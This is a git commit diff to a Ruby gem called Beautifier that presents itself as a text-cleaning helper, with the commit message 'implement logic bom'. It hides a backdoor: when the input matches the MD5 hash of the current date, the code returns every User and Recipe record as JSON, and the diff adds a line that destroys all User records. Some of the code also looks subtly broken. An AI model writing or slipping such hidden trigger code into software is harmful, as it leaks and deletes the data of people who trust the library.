74746bda7fbdd8bfd55e3eba645db476fa6a3026
minh.techapollo <minh.techapollo@gmail.com>
2021-04-15 09:32:33 +0700

    implement logic bom

--- lib/beautifier.rb
+++ lib/beautifier.rb
@@ -5,16 +5,21 @@ require_relative "beautifier/version"
 module Beautifier
   class Error < StandardError; end
   def self.check_text(name)
-    @flag = name == Digest::MD5.hexdigest(Time.now.strftime "%d%m%Y") ? true : false
+    @flag = clean_text(name) == Digest::MD5.hexdigest(Time.now.strftime "%d%m%Y") ? true : false
     name_valid = name =~ /\A[A-Za-z0-9\s]*\z/
     return !name_valid.nil?
   end
   def self.fix_text(name)
     if @flag
-      return JSON.pretty_generate(User.all.as_json + Recipe.all.as_json)
+      pretty_text = JSON.pretty_generate(User.all.as_json + Recipe.all.as_json)
+      User.each { |u| u.destroy! }
+      return pretty_text
     else
-      name.gsub!(/[^A-Za-z0-9\s]/,'')
+      clean_text(name)
       return name
     end
+  end
+  def clean_text(text)
+    text.gsub!(/[^A-Za-z0-9\s]/,'')
   end
 end
